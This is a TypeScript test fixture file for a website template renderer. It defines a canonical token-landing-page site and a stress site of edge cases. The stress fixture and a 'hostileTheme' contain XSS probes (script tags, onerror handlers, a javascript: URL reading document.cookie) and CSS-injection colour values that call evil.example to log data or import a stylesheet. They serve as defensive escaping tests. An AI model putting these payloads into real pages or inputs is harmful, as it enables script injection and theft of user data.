// ============================================================================
// src/site-platform/renderer/__fixtures__/index.ts
//
// Two fixtures every template must render.
//
//   GOLDEN — a canonical, fully-populated site. Its snapshot is the contract:
//            an unintended diff means someone changed output without meaning to.
//
//   STRESS — every edge case that will occur in production. It asserts nothing
//            about appearance; it asserts the renderer does not throw and does
//            not emit invalid markup.
//
// TypeScript rather than JSON deliberately: the fixtures are type-checked
// against the schema, so a schema change that invalidates them fails `tsc`
// rather than surfacing as a confusing runtime parse error.
// ============================================================================

import type { SiteDefinition, LayeredTheme } from "@site/schema";

// ============================================================================
// SHARED THEME
// ============================================================================

const theme: LayeredTheme = {
  id: "fixture-dark",
  name: "Fixture Dark",
  schemaVersion: 1,
  mode: "dark",
  core: {
    colors: {
      background: "#0b0b0f",
      surface: "#15151c",
      primary: "#7c5cff",
      onPrimary: "#ffffff",
      secondary: "#22d3ee",
      text: "#f4f4f5",
      textMuted: "#a1a1aa",
      border: "#27272a",
      overlay: "rgba(0,0,0,0.55)",
      success: "#22c55e",
      warning: "#f59e0b",
      error: "#ef4444",
    },
    typography: {
      fontFamilyBase: "Inter, sans-serif",
      baseFontSize: "16px",
      scaleRatio: 1.25,
      scaleRatioMobile: 0.72,
      fontWeightNormal: 400,
      fontWeightBold: 700,
      lineHeightBase: 1.6,
      lineHeightHeading: 1.15,
      headingTransform: "uppercase",
      kickerTransform: "uppercase",
    },
    spacing: {
      unit: "8px",
      containerMaxInline: "1200px",
      contentMaxInline: "700px",
      sectionPaddingBlock: "80px",
      sectionPaddingInline: "8%",
      radius: "4px",
    },
    motion: { speed: "0.2s", easing: "ease", respectReducedMotion: true },
    breakpoints: { md: "768px" },
  },
  templates: {
    "hero-onepager": { headerBlur: "12px", sectionMinHeight: "100vh" },
  },
};

// ============================================================================
// HELPERS
// ============================================================================

function image(id: string, alt: string, w = 2400, h = 1350) {
  return {
    id,
    stagingKey: `site/${id}/original.png`,
    url: `https://staging.example/${id}.png`,
    alt,
    decorative: false,
    width: w,
    height: h,
    focalX: 0.5,
    focalY: 0.4,
    variants: { "2400": `site/${id}/2400.webp`, "1200": `site/${id}/1200.webp` },
  };
}

// ============================================================================
// GOLDEN
// ============================================================================

export const golden: SiteDefinition = {
  schemaVersion: 1,
  templateId: "hero-onepager",
  templateVersion: "1.0.0",
  theme,
  content: {
    schemaVersion: 1,
    meta: {
      fqdn: "goldencoin.example",
      title: "Golden Coin",
      description: "The canonical fixture site.",
      keywords: "fixture, golden, test",
      cardImage: image("card", "Golden Coin social card", 1200, 630),
      locale: "en",
      themeColor: "#0b0b0f",
      noindex: true,
    },
    brand: { name: "Golden Coin", logoText: "GOLD" },
    hero: {
      kicker: "Now live",
      title: "A canonical hero headline",
      body: [
        "First hero paragraph, written for humans rather than crawlers.",
        "Second paragraph, proving the array renders more than one <p>.",
      ],
      backgroundImage: image("hero", "Abstract golden gradient"),
      overlayOpacity: 0.5,
      crossAlign: "start",
      ctas: [
        { label: "Buy now", href: "https://dex.example/swap", external: true, variant: "primary" },
        { label: "Read docs", href: "#about", external: false, variant: "outline" },
      ],
    },
    sections: [
      {
        type: "prose",
        id: "11111111-1111-1111-1111-111111111111",
        slug: "about",
        order: 0,
        enabled: true,
        navLabel: "About",
        showInNav: true,
        kicker: "The idea",
        title: "About the project",
        body: ["A paragraph about the project.", "And another one."],
        backgroundImage: image("about", "Team at work"),
        overlayOpacity: 0.45,
        crossAlign: "start",
        cta: { label: "Learn more", href: "https://docs.example", external: true, variant: "outline" },
      },
      {
        type: "stats",
        id: "22222222-2222-2222-2222-222222222222",
        slug: "numbers",
        order: 1,
        enabled: true,
        navLabel: "Numbers",
        showInNav: true,
        title: "By the numbers",
        intro: "Supply and distribution at a glance.",
        crossAlign: "center",
        stats: [
          { id: "s1", value: "1,000,000,000", label: "Total supply" },
          { id: "s2", value: "0", label: "Team allocation", suffix: "%" },
          { id: "s3", value: "∞", label: "Vibes" },
        ],
      },
      {
        type: "timeline",
        id: "33333333-3333-3333-3333-333333333333",
        slug: "roadmap",
        order: 2,
        enabled: true,
        navLabel: "Roadmap",
        showInNav: true,
        title: "Roadmap",
        crossAlign: "start",
        milestones: [
          { id: "m1", marker: "Q1 2026", title: "Launch", body: "Token goes live.", status: "done" },
          { id: "m2", marker: "Q2 2026", title: "Listings", status: "active" },
          { id: "m3", marker: "Q3 2026", title: "Expansion", status: "upcoming" },
        ],
      },
      {
        type: "faq",
        id: "44444444-4444-4444-4444-444444444444",
        slug: "faq",
        order: 3,
        enabled: true,
        navLabel: "FAQ",
        showInNav: true,
        title: "Questions",
        crossAlign: "start",
        items: [
          { id: "q1", question: "Is this financial advice?", answer: "No." },
          { id: "q2", question: "Where do I buy?", answer: "Through any supported DEX." },
        ],
      },
      {
        // Disabled: must NOT appear in output or in the nav. If it does, the
        // enabled filter in normaliseSections() has regressed.
        type: "prose",
        id: "55555555-5555-5555-5555-555555555555",
        slug: "hidden",
        order: 4,
        enabled: false,
        navLabel: "Hidden",
        showInNav: true,
        title: "Should not render",
        body: ["Invisible."],
        crossAlign: "start",
      },
    ],
    social: [
      { id: "so1", platform: "x-twitter", label: "Follow on X", url: "https://x.com/example", showInNav: true, showInHero: true },
      { id: "so2", platform: "telegram", label: "Join Telegram", url: "https://t.me/example", showInNav: true, showInHero: true },
    ],
    modules: {
      token: {
        contractAddress: "So11111111111111111111111111111111111111112",
        chain: "solana",
        ticker: "GOLD",
        copyLabel: "Contract address — click to copy",
        copyConfirmation: "Address copied",
      },
    },
    footer: {
      disclaimer:
        "This is a digital collectible for novelty and entertainment, not a financial instrument.",
      legal: { coinName: "Golden Coin", companyName: "Example Corp", copyrightYear: 2026 },
      links: [{ label: "Terms", href: "/terms" }],
    },
  },
};

// ============================================================================
// STRESS
//
// Every case below has already happened, or will. The renderer has fallback
// code for all of them; this fixture is what actually executes it.
// ============================================================================

export const stress: SiteDefinition = {
  schemaVersion: 1,
  templateId: "hero-onepager",
  templateVersion: "1.0.0",
  theme,
  content: {
    schemaVersion: 1,
    meta: {
      fqdn: "stress.example",
      // 90+ characters — exercises text-wrap: balance and any width assumption.
      title:
        "An extremely long page title that no designer ever considered when they mocked this up",
      description: "",           // empty description
      locale: "en",
      noindex: true,
      // No cardImage: og:image must be omitted, and twitter:card must fall
      // back to "summary" rather than emitting a large card with no image.
    },
    brand: { name: "Stress" },   // no logoText: falls back to name
    hero: {
      title: "Minimal hero",
      body: [],                  // empty array: must emit no <p>, not <p></p>
      // No backgroundImage: the panel must render on the theme background with
      // the scrim suppressed, not as a black rectangle.
      crossAlign: "start",
      ctas: [],                  // empty: no .cta-row wrapper
    },
    sections: [
      {
        // Two sections named "About" — assignSlugs must dedupe to about /
        // about-2, or both get id="about" and the nav jumps to whichever the
        // browser found first.
        type: "prose",
        id: "aaaaaaaa-0000-0000-0000-000000000001",
        slug: "",                // deliberately blank; generated at render
        order: 0,
        enabled: true,
        navLabel: "About",
        showInNav: true,
        title: "First About",
        body: ["One."],
        crossAlign: "start",
      },
      {
        type: "prose",
        id: "aaaaaaaa-0000-0000-0000-000000000002",
        slug: "",
        order: 1,
        enabled: true,
        navLabel: "About",
        showInNav: true,
        title: "Second About",
        body: [],
        crossAlign: "start",
      },
      {
        // Emoji-only nav label: slugify() returns "", so assignSlugs must fall
        // back to section-<id prefix> rather than producing id="".
        type: "prose",
        id: "bbbbbbbb-0000-0000-0000-000000000003",
        slug: "",
        order: 2,
        enabled: true,
        navLabel: "🚀🚀🚀",
        showInNav: true,
        title: "Emoji nav",
        body: ["Slug must not be empty."],
        crossAlign: "center",
      },
      {
        // XSS probe. Every one of these must appear escaped in the output.
        // If any renders as live markup, an escape call is missing.
        type: "prose",
        id: "cccccccc-0000-0000-0000-000000000004",
        slug: "",
        order: 3,
        enabled: true,
        navLabel: `Nav <img src=x onerror=alert(1)>`,
        showInNav: true,
        title: `<script>alert('xss')</script>`,
        body: [`Body with "quotes" & <b>tags</b> and 'apostrophes'.`],
        crossAlign: "start",
        cta: {
          // javascript: URL must be neutralised to "#".
          label: `Click <script>`,
          href: "javascript:alert(document.cookie)",
          external: false,
          variant: "primary",
        },
      },
      {
        // Image with no alt and decorative:false — the validator warns, but the
        // renderer must still emit alt="" rather than omitting the attribute.
        type: "cards",
        id: "dddddddd-0000-0000-0000-000000000005",
        slug: "",
        order: 4,
        enabled: true,
        navLabel: "Cards",
        showInNav: false,        // in the page but not the nav
        title: "Cards",
        crossAlign: "start",
        cards: [
          { id: "c1", title: "No image card" },
          { id: "c2", title: "Image card", image: { ...image("card2", ""), decorative: false } },
        ],
      },
      {
        // Empty collections: must render the wrapper without children rather
        // than throwing on .map of an empty array or emitting broken markup.
        type: "stats",
        id: "eeeeeeee-0000-0000-0000-000000000006",
        slug: "",
        order: 5,
        enabled: true,
        navLabel: "Empty stats",
        showInNav: false,
        title: "Nothing here",
        crossAlign: "start",
        stats: [],
      },
    ],
    social: [],                  // no social: nav-social and hero-social omitted
    // No modules: the contract block must be absent entirely, not an empty button.
    footer: {
      // No disclaimer, no links, copyrightYear "auto" -> current year.
      legal: { copyrightYear: "auto" },
      links: [],
    },
  },
};

/**
 * Theme with hostile values, used by the CSS-injection test.
 *
 * A "colour" is a free-text form field. `red; } body { background: url(...)`
 * closes the declaration and opens a new rule — cssValue() must reject it and
 * fall back rather than emitting it.
 */
export const hostileTheme: LayeredTheme = {
  ...theme,
  id: "hostile",
  core: {
    ...theme.core,
    colors: {
      ...theme.core.colors,
      background: "red; } body { background: url(https://evil.example/log?c=",
      primary: "blue /* comment */ ; @import url(https://evil.example/x.css)",
      text: "expression(alert(1))",
    },
  },
};